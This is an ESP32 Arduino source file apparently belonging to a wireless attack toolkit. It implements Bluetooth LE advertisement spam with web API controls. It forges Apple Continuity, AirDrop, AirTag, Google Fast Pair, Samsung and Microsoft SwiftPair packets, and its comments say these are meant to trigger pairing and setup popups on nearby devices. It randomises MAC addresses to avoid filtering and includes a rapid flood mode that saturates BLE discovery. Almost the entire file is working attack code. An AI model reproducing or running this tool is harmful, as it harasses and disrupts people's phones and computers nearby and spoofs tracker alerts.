#pragma once
#include <Arduino.h>
#include <NimBLEDevice.h>
#include <mbedtls/ecp.h>
#include <mbedtls/ctr_drbg.h>
extern "C" int ble_hs_id_set_rnd(const uint8_t* rand_addr);

static NimBLEAdvertising* g_adv = nullptr;
static uint8_t g_blePkt[31];
static bool g_scanning = false;

static void bleInit() {
  if (g_adv) return;
  NimBLEDevice::init("doom");
  g_adv = NimBLEDevice::getAdvertising();
  g_adv->setMinInterval(32);
  g_adv->setMaxInterval(48);
}

static inline void bleSig(const uint8_t* sig, size_t n) {
  memset(g_blePkt, 0, 31);
  memcpy(g_blePkt + 2, sig, n > 29 ? 29 : n);
  g_blePkt[0] = 0x1e; g_blePkt[1] = 0xff;
}
static inline void bleAndroidSig(const uint8_t* sig, size_t n) {
  memset(g_blePkt, 0, 31);
  memcpy(g_blePkt, sig, n > 31 ? 31 : n);
}

static const uint8_t S_AIRPODS[]   = {0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12};
static const uint8_t S_AIRPODS_PRO[]={0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12};
static const uint8_t S_AIRPODS_MAX[]={0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12};
static const uint8_t S_APPLE_TV[]  = {0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12};
static const uint8_t S_VISION[]    = {0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12};

static const uint8_t S_FASTPAIR[]  = {0x03,0x03,0x2c,0xfe,0x16,0x16,0x2c,0xfe,0x00,0x00,0x00,0x00,0x00};
static const uint8_t S_SWIFTPAIR[] = {0x03,0x03,0x53,0xfe,0x16,0x16,0x53,0xfe,0x00,0x00,0x00,0x00,0x00};

static const uint8_t* const APPLE_SET[] = {S_AIRPODS, S_AIRPODS_PRO, S_AIRPODS_MAX, S_APPLE_TV, S_VISION};

static void bleRotate() {
  static bool once = false;
  if (!once) { NimBLEDevice::setOwnAddrType(1); once = true; }
  uint8_t r[6];
  for (int i = 0; i < 6; i++) r[i] = esp_random() & 0xFF;
  r[5] |= 0xC0;
  ble_hs_id_set_rnd(r);
}

static void bleAppleRandom() {
  bleInit(); bleRotate();
  bleSig(APPLE_SET[esp_random() % 5], 17);
  NimBLEAdvertisementData d;
  d.addData(std::string((char*)g_blePkt, 31));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}
static void bleAndroid() {
  bleInit(); bleRotate();
  bleAndroidSig(S_FASTPAIR, sizeof(S_FASTPAIR));
  g_blePkt[8] = esp_random() & 0xFF;
  NimBLEAdvertisementData d;
  d.addData(std::string((char*)g_blePkt, 31));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}
static void bleWindows() {
  bleInit(); bleRotate();
  bleAndroidSig(S_SWIFTPAIR, sizeof(S_SWIFTPAIR));
  NimBLEAdvertisementData d;
  d.addData(std::string((char*)g_blePkt, 31));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}

static void bleAirTag() {
  bleInit();
  mbedtls_ecp_group grp; mbedtls_ecp_point Q; mbedtls_mpi d;
  mbedtls_ecp_group_init(&grp); mbedtls_ecp_point_init(&Q); mbedtls_mpi_init(&d);
  uint8_t xy[56] = {0};
  if (mbedtls_ecp_group_load(&grp, MBEDTLS_ECP_DP_SECP224R1) == 0) {
    uint8_t rnd[32];
    for (int i = 0; i < 32; i += 4) { uint32_t r = esp_random(); memcpy(rnd + i, &r, 4); }
    mbedtls_mpi_read_binary(&d, rnd, 32);
    mbedtls_mpi_mod_mpi(&d, &d, &grp.N);
    if (mbedtls_ecp_mul(&grp, &Q, &d, &grp.G, nullptr, nullptr) == 0) {
      mbedtls_mpi_write_binary(&Q.X, xy, 28);
      mbedtls_mpi_write_binary(&Q.Y, xy + 28, 28);
    }
  }

  memset(g_blePkt, 0, 31);
  g_blePkt[0] = 0x1e; g_blePkt[1] = 0xff;
  static const uint8_t hdr[5] = {0x4c,0x00,0x12,0x19,0x00};
  memcpy(g_blePkt + 2, hdr, 5);
  memcpy(g_blePkt + 7, xy, 22);
  g_blePkt[29] = esp_random() & 0x03;
  g_blePkt[30] = 0x00;

  NimBLEAdvertisementData ad;
  ad.addData(std::string((char*)g_blePkt, 31));
  g_adv->stop(); g_adv->setAdvertisementData(ad); g_adv->start();

  mbedtls_mpi_free(&d); mbedtls_ecp_point_free(&Q); mbedtls_ecp_group_free(&grp);
}
static void bleIBeacon() {
  bleInit(); bleRotate();
  memset(g_blePkt, 0, 31);
  g_blePkt[0]=0x1a; g_blePkt[1]=0xff; g_blePkt[2]=0x4c; g_blePkt[3]=0x00;
  g_blePkt[4]=0x02; g_blePkt[5]=0x15;
  for (int i = 6; i < 22; i++) g_blePkt[i] = 0xAA;
  g_blePkt[22]=0; g_blePkt[23]=1; g_blePkt[24]=0; g_blePkt[25]=1; g_blePkt[26]=0xC5;
  NimBLEAdvertisementData d; d.addData(std::string((char*)g_blePkt, 31));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}

static void bleEddystone() {
  bleInit(); bleRotate();
  memset(g_blePkt, 0, 31);
  g_blePkt[0]=0x03; g_blePkt[1]=0x03; g_blePkt[2]=0xaa; g_blePkt[3]=0xfe;
  g_blePkt[4]=0x11; g_blePkt[5]=0x16; g_blePkt[6]=0xaa; g_blePkt[7]=0xfe;
  g_blePkt[8]=0x10; g_blePkt[9]=0x00; g_blePkt[10]=0x03;
  const char* u = "venice.ai";
  for (int k = 11; k < 31 && *u; k++) g_blePkt[k] = *u++;
  NimBLEAdvertisementData d; d.addData(std::string((char*)g_blePkt, 31));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}

static void bleScanFlood() {
  bleInit();
  if (g_adv) g_adv->stop();
  NimBLEScan* sc = NimBLEDevice::getScan();
  sc->stop();                 // stop Aegis passive scan before changing parameters
  g_scanning = true;
  sc->setActiveScan(true);
  sc->setInterval(60);
  sc->setWindow(59);
  sc->start(0, nullptr, false);
}

static void bleSamsung() {
  bleInit(); bleRotate();
  memset(g_blePkt, 0, 31);
  g_blePkt[0]=0x03; g_blePkt[1]=0x03; g_blePkt[2]=0x2c; g_blePkt[3]=0xfe;
  g_blePkt[4]=0x16; g_blePkt[5]=0x16; g_blePkt[6]=0x2c; g_blePkt[7]=0xfe;
  g_blePkt[8]=0x01; g_blePkt[9]=0x2D; g_blePkt[10]=0x00;
  NimBLEAdvertisementData d; d.addData(std::string((char*)g_blePkt, 31));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}

static void bleNameSpam() {
  bleInit(); bleRotate();
  static const char* nm[] = {"AirPods Pro", "Galaxy Buds", "JBL Flip", "Bose QC45",
                             "Pixel Buds", "Beats Fit", "Soundcore", "WH-1000XM5"};
  const char* n = nm[esp_random() % 8];
  size_t l = strlen(n); if (l > 20) l = 20;
  memset(g_blePkt, 0, 31);
  g_blePkt[0] = (uint8_t)(l + 1); g_blePkt[1] = 0x09;
  memcpy(g_blePkt + 2, n, l);
  NimBLEAdvertisementData d; d.addData(std::string((char*)g_blePkt, l + 2));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}

// Apple Continuity Nearby Action spam (triggers setup/pairing popups)
// action: 0x01=AppleTVSetup, 0x07=iPhoneNewSetup, 0x09=HomePodSetup,
//         0x0B=AppleTVPair, 0x20=WatchSetup, 0x27=iPhoneSetup
static void bleContinuity(uint8_t action) {
  bleInit(); bleRotate();
  memset(g_blePkt, 0, 31);
  // Apple Continuity Nearby Action: type 0x10
  g_blePkt[0]=0x1e; g_blePkt[1]=0xff;  // Manufacturer Specific, length 30
  g_blePkt[2]=0x4c; g_blePkt[3]=0x00;  // Apple company ID
  g_blePkt[4]=0x10; g_blePkt[5]=0x05;  // Nearby Action, length 5
  g_blePkt[6]=0x04;                     // flags (audio sharing etc)
  g_blePkt[7]=action;                   // action code
  g_blePkt[8]=(uint8_t)(esp_random()&0xff);
  g_blePkt[9]=(uint8_t)(esp_random()&0xff);
  g_blePkt[10]=(uint8_t)(esp_random()&0xff);
  NimBLEAdvertisementData d;
  d.addData(std::string((char*)g_blePkt, 11));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}

// Apple Handoff / Universal Clipboard
static void bleHandoff() {
  bleInit(); bleRotate();
  memset(g_blePkt, 0, 31);
  g_blePkt[0]=0x1e; g_blePkt[1]=0xff;
  g_blePkt[2]=0x4c; g_blePkt[3]=0x00;
  g_blePkt[4]=0x0c; g_blePkt[5]=0x0e;  // Handoff, length 14
  g_blePkt[6]=0x01; g_blePkt[7]=0x01;
  for (int i=8;i<22;i++) g_blePkt[i]=(uint8_t)(esp_random()&0xff);
  NimBLEAdvertisementData d;
  d.addData(std::string((char*)g_blePkt, 22));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}

// Google Nearby Notifications (triggers Google discovery popup on Android)
static void bleGoogleNearby() {
  bleInit(); bleRotate();
  memset(g_blePkt, 0, 31);
  // Google Nearby (Service UUID 0xFEAA + data)
  g_blePkt[0]=0x03; g_blePkt[1]=0x03; g_blePkt[2]=0xaa; g_blePkt[3]=0xfe;
  g_blePkt[4]=0x06; g_blePkt[5]=0x16; g_blePkt[6]=0xaa; g_blePkt[7]=0xfe;
  g_blePkt[8]=0x40;  // frame type 0x40 = Nearby Notifications
  g_blePkt[9]=(uint8_t)(esp_random()&0xff);  // TX power
  g_blePkt[10]=(uint8_t)(esp_random()&0xff);
  NimBLEAdvertisementData d;
  d.addData(std::string((char*)g_blePkt, 11));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}

// Microsoft SwiftPair (enhanced — triggers Windows 10+ pairing popup)
static void bleSwiftPairAdv() {
  bleInit(); bleRotate();
  memset(g_blePkt, 0, 31);
  // Microsoft SwiftPair: Company ID 0x0006, type 0x03=pairing
  g_blePkt[0]=0x1e; g_blePkt[1]=0xff;
  g_blePkt[2]=0x06; g_blePkt[3]=0x00;  // Microsoft company ID
  g_blePkt[4]=0x03;                     // SwiftPair subtype
  g_blePkt[5]=0x00;
  static const char* names[] = {"Xbox Controller","Surface Headphones","Sculpt Mouse","Arc Mouse"};
  const char* nm = names[esp_random()%4];
  size_t nl = strlen(nm); if (nl>20) nl=20;
  memcpy(g_blePkt+6, nm, nl);
  NimBLEAdvertisementData d;
  d.addData(std::string((char*)g_blePkt, 6+nl));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}

// AirDrop discovery flood (shows as contact in AirDrop)
static void bleAirDrop() {
  bleInit(); bleRotate();
  memset(g_blePkt, 0, 31);
  g_blePkt[0]=0x1e; g_blePkt[1]=0xff;
  g_blePkt[2]=0x4c; g_blePkt[3]=0x00;
  g_blePkt[4]=0x05; g_blePkt[5]=0x12;  // AirDrop, length 18
  for (int i=6;i<24;i++) g_blePkt[i]=(uint8_t)(esp_random()&0xff);
  NimBLEAdvertisementData d;
  d.addData(std::string((char*)g_blePkt, 24));
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}

// Cycle through ALL Apple Continuity action codes rapidly
static void bleContinuityAll() {
  static uint8_t idx = 0;
  static const uint8_t actions[] = {0x01,0x07,0x09,0x0B,0x0C,0x0D,0x20,0x27};
  bleContinuity(actions[idx++ % 8]);
}

// High-rate advertising flood with random payload (saturates BLE discovery)
static void bleRapidFlood() {
  bleInit(); bleRotate();
  memset(g_blePkt, 0, 31);
  g_blePkt[0]=0x1e; g_blePkt[1]=0xff;
  g_blePkt[2]=(uint8_t)(esp_random()&0xff); g_blePkt[3]=(uint8_t)(esp_random()&0xff);
  for (int i=4;i<31;i++) g_blePkt[i]=(uint8_t)(esp_random()&0xff);
  NimBLEAdvertisementData d;
  d.addData(std::string((char*)g_blePkt, 31));
  g_adv->setMinInterval(16); g_adv->setMaxInterval(16); // fastest possible (10ms)
  g_adv->stop(); g_adv->setAdvertisementData(d); g_adv->start();
}

static void bleStop() {
  if (!g_adv) return;
  g_adv->stop();
  if (g_scanning) {
    NimBLEDevice::getScan()->stop();
    g_scanning = false;
    NimBLEDevice::getScan()->setActiveScan(false);
    NimBLEDevice::getScan()->setInterval(1000);
    NimBLEDevice::getScan()->setWindow(50);
    NimBLEDevice::getScan()->start(0, nullptr, false);
  }
}

static String g_bleMode = "apple";
static uint32_t g_bleTick = 0;

static bool blespam_start(const String& q) {
  int i; String mo;
  if ((i = q.indexOf("mode=")) >= 0) { int e = q.indexOf('&',i); mo = q.substring(i+5,e<0?q.length():e); }
  g_bleMode = mo.length() ? mo : "apple";
  g_bleTick = 0;
  return true;
}

static void blespam_loop() {
  static uint32_t last = 0;
  uint32_t now = millis();
  if (now - last < 200) return;
  last = now;
  g_bleTick++;
  const String& m = g_bleMode;
  if      (m=="apple")          bleAppleRandom();
  else if (m=="android")        bleAndroid();
  else if (m=="windows")        bleWindows();
  else if (m=="samsung")        bleSamsung();
  else if (m=="airtag")         bleAirTag();
  else if (m=="ibeacon")        bleIBeacon();
  else if (m=="eddystone")      bleEddystone();
  else if (m=="namespam")       bleNameSpam();
  else if (m=="scan")           bleScanFlood();
  else if (m=="continuity")     bleContinuityAll();
  else if (m=="handoff")        bleHandoff();
  else if (m=="airdrop")        bleAirDrop();
  else if (m=="googlenearby")   bleGoogleNearby();
  else if (m=="swiftpair")      bleSwiftPairAdv();
  else if (m=="rapidflood")     bleRapidFlood();
  else                          bleAppleRandom();
}

static void blespam_stop() { bleStop(); }

static void blespam_routesW() {
  extern WebServer server;
  server.on("/api/blespam/start", HTTP_POST, [](){
    String q; for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
    bool ok = tool_start("blespam", q);
    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/blespam/stop", HTTP_POST, [](){
    tool_stop("blespam"); server.send(200,"application/json","{\"ok\":1}");
  });
  server.on("/api/blespam/status", HTTP_GET, [](){
    bool r = g_adv && g_adv->isAdvertising();
    server.send(200,"application/json",
      "{\"running\":"+String(r?1:0)+
      ",\"mode\":\""+g_bleMode+
      "\",\"tick\":"+String(g_bleTick)+
      ",\"msg\":\""+g_bleMode+" tick "+String(g_bleTick)+"\"}");
  });
}
